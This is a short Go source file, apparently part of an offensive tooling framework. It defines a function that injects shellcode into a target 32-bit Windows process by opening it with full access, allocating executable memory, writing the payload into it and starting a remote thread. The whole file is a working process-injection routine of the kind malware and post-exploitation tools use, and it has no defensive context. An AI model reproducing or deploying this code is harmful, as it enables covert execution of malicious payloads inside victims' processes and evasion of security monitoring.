package actions

import (
	"syscall"
	"unsafe"
)
/*
In this function, the generated shellcode is injected to target 32 bit process by using Win32 API Calls.
*/
func InjectShellCode(shellcode []byte, pid uint32){
	MEM_COMMIT := uintptr(0x1000)
	PAGE_EXECUTE_READWRITE := uintptr(0x40)
	PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	openProc := kernel32.MustFindProc("OpenProcess")
	virtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMem := kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread := kernel32.MustFindProc("CreateRemoteThread")
	closeHandle := kernel32.MustFindProc("CloseHandle")

	processHandle, _, _ := openProc.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	remoteBuffer, _, _ := virtualAllocEx.Call(processHandle, 0,uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	writeProcessMem.Call(processHandle, remoteBuffer, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	createRemoteThread.Call(processHandle, 0, 0, remoteBuffer, 0,0,0)
	closeHandle.Call(processHandle)
}

